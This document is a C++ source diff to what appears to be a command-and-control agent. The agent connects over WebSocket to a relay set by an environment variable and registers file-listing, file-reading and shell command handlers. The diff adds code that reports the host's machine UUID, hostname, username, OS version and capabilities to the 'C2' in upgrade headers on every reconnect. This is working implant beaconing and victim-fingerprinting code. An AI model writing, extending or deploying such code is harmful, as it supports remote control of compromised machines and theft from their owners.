@@ -2,14 +2,113 @@
 #include "runtime.h"
 #include "websocket_client.h"
 #include "shell.h"
+#include "core/memory/memory.h"
+#include "core/string/string.h"
 #include "platform/system/environment.h"
+#include "platform/system/system_info.h"
+
+/**
+ * Builds the identity header block sent with the /agent WebSocket upgrade (API 1).
+ *
+ * @details Identity travels as HTTP headers. The relay
+ * copies these headers into its agent events and /status; the C2 consumes them as
+ * typed fields without parsing anything binary. Two formats must stay stable:
+ *  - X-Agent-Uuid: the machine UUID's 16 bytes formatted as C# Guid.ToString()
+ *    (Data1-3 little-endian/reversed, Data4-5 raw) — identical to what the C2 has
+ *    historically keyed agents on, so machines registered by older builds keep
+ *    their identity.
+ *  - X-Agent-Capabilities: the 8-byte capability-category bitmap as lowercase hex.
+ *
+ * @param info Populated SystemInfo (the same data the old Hello response carried).
+ * @param out Output buffer for CRLF-terminated header lines (no trailing blank line).
+ * @return Total header-block length, or 0 if the buffer was too small.
+ */
+static USIZE BuildIdentityHeaders(const SystemInfo &info, Span<CHAR> out)
+{
+    const CHAR *hex = "0123456789abcdef";
+    USIZE off = 0;
+
+    auto append = [&](PCCHAR s) -> BOOL
+    {
+        USIZE len = StringUtils::Length(s);
+        if (off + len >= out.Size())
+            return false;
+        Memory::Copy(out.Data() + off, s, len);
+        off += len;
+        return true;
+    };
+    auto appendNum = [&](UINT64 value) -> BOOL
+    {
+        CHAR buf[24];
+        USIZE len = StringUtils::UIntToStr(value, Span<CHAR>(buf, sizeof(buf)));
+        if (off + len >= out.Size())
+            return false;
+        Memory::Copy(out.Data() + off, buf, len);
+        off += len;
+        return true;
+    };
+
+    // Reconstruct the UUID's raw 16 bytes from its 64-bit halves.
+    UINT64 msb = info.MachineUUID.GetMostSignificantBits();
+    UINT64 lsb = info.MachineUUID.GetLeastSignificantBits();
+    UINT8 ub[16];
+    for (INT32 i = 0; i < 8; i++)
+        ub[i] = (UINT8)(msb >> (56 - 8 * i));
+    for (INT32 i = 0; i < 8; i++)
+        ub[8 + i] = (UINT8)(lsb >> (56 - 8 * i));
+
+    CHAR uuid[37];
+    {
+        INT32 o = 0;
+        auto put = [&](UINT8 byte)
+        {
+            uuid[o++] = hex[byte >> 4];
+            uuid[o++] = hex[byte & 0xF];
+        };
+        put(ub[3]); put(ub[2]); put(ub[1]); put(ub[0]); uuid[o++] = '-';
+        put(ub[5]); put(ub[4]); uuid[o++] = '-';
+        put(ub[7]); put(ub[6]); uuid[o++] = '-';
+        for (INT32 i = 8; i < 12; i++) put(ub[i]);
+        uuid[o++] = '-';
+        for (INT32 i = 12; i < 16; i++) put(ub[i]);
+        uuid[o] = '\0';
+    }
+
+    CapabilityMask mask = BuildCapabilityMask();
+
+    BOOL ok = true;
+    ok = ok && append("X-Agent-Api-Version: ") && appendNum(AGENT_API_VERSION) && append("\r\n");
+    ok = ok && append("X-Agent-Uuid: ") && append(uuid) && append("\r\n");
+    ok = ok && append("X-Agent-Hostname: ") && append(info.Hostname) && append("\r\n");
+    ok = ok && append("X-Agent-Username: ") && append(info.Username) && append("\r\n");
+    ok = ok && append("X-Agent-Arch: ") && append(info.Architecture) && append("\r\n");
+    ok = ok && append("X-Agent-Platform: ") && append(info.AgentPlatform) && append("\r\n");
+    ok = ok && append("X-Agent-Os-Version: ") && append(info.OSVersion) && append("\r\n");
+    ok = ok && append("X-Agent-Build: ") && appendNum(AGENT_BUILD_NUMBER) && append("\r\n");
+    ok = ok && append("X-Agent-Commit: ") && append(AGENT_COMMIT_HASH) && append("\r\n");
+    ok = ok && append("X-Agent-Name-Id: ") && appendNum(AGENT_NAME_ID) && append("\r\n");
+    ok = ok && append("X-Agent-Bitness: ") && appendNum(sizeof(void *) * 8) && append("\r\n");
+    ok = ok && append("X-Agent-Capabilities: ");
+    for (USIZE i = 0; ok && i < CAPABILITY_MASK_BYTES; i++)
+    {
+        CHAR byte[2] = {hex[mask.Bits[i] >> 4], hex[mask.Bits[i] & 0xF]};
+        if (off + 2 >= out.Size())
+        {
+            ok = false;
+            break;
+        }
+        Memory::Copy(out.Data() + off, byte, 2);
+        off += 2;
+    }
+    ok = ok && append("\r\n");
+
+    return ok ? off : 0;
+}
 
 static const CHAR *CommandTypeName(UINT8 type)
 {
     switch (type)
     {
-    case CommandType::Command_Hello:
-        return "Hello";
     case CommandType::Command_GetDirectoryContent:
         return "GetDirectoryContent";
     case CommandType::Command_GetFileContent:
@@ -37,13 +136,13 @@ static const CHAR *CommandTypeName(UINT8 type)
 
 INT32 start()
 {
-    // Resolve the relay URL from the R_URL environment variable at runtime.
+    // Resolve the relay URL from the W_URL environment variable at runtime.
     // There is no fallback: the agent will not run without an explicit endpoint.
     CHAR urlBuffer[512];
-    USIZE urlLen = Environment::GetVariable("R_URL", Span<CHAR>(urlBuffer, sizeof(urlBuffer)));
+    USIZE urlLen = Environment::GetVariable("W_URL", Span<CHAR>(urlBuffer, sizeof(urlBuffer)));
     if (urlLen == 0)
     {
-        LOG_ERROR("R_URL environment variable is not set; cannot start agent without a relay endpoint");
+        LOG_ERROR("W_URL environment variable is not set; cannot start agent without a relay endpoint");
         return 0;
     }
     Span<const CHAR> urlSpan(urlBuffer, urlLen); // exclude null terminator (ParseUrl bounds on Span size)
@@ -53,7 +152,6 @@ INT32 start()
 
     CommandHandler commandHandlers[CommandType::CommandTypeCount] = {nullptr};
     // Core (mandatory, always registered)
-    commandHandlers[CommandType::Command_Hello] = Handle_HelloCommand;
     commandHandlers[CommandType::Command_Exit] = Handle_ExitCommand;
 #if SUPPORT_FILESYSTEM
     commandHandlers[CommandType::Command_GetDirectoryContent] = Handle_GetDirectoryContentCommand;
@@ -78,14 +176,28 @@ INT32 start()
         connectionAttempt++;
         LOG_INFO("Connection attempt #%u to %s", connectionAttempt, (PCCHAR)urlBuffer);
 
-        auto createResult = WebSocketClient::Create(urlSpan);
+        // Identity rides the upgrade request as HTTP headers (API 1) — no Hello
+        // frame. Built fresh per connection so a changed hostname/user follows
+        // the reconnect.
+        SystemInfo identityInfo;
+        GetSystemInfo(&identityInfo);
+        CHAR identityHeaders[1024];
+        USIZE identityHeadersLen = BuildIdentityHeaders(identityInfo, Span<CHAR>(identityHeaders, sizeof(identityHeaders)));
+        if (identityHeadersLen == 0)
+        {
+            LOG_ERROR("Identity header block does not fit (attempt #%u)", connectionAttempt);
+            return 0;
+        }
+
+        auto createResult = WebSocketClient::Create(urlSpan, Span<const CHAR>(identityHeaders, identityHeadersLen));
         if (!createResult)
         {
             LOG_ERROR("Connection attempt #%u failed: unable to open WebSocket to %s", connectionAttempt, (PCCHAR)urlBuffer);
             return 0;
         }
         WebSocketClient &wsClient = createResult.Value();
-        LOG_INFO("WebSocket connection established (attempt #%u) to %s", connectionAttempt, (PCCHAR)urlBuffer);
+        LOG_INFO("WebSocket connection established (attempt #%u) to %s (identity sent in upgrade headers)",
+                 connectionAttempt, (PCCHAR)urlBuffer);
 
         UINT32 messageCount = 0;
         while (!context.shouldExit)
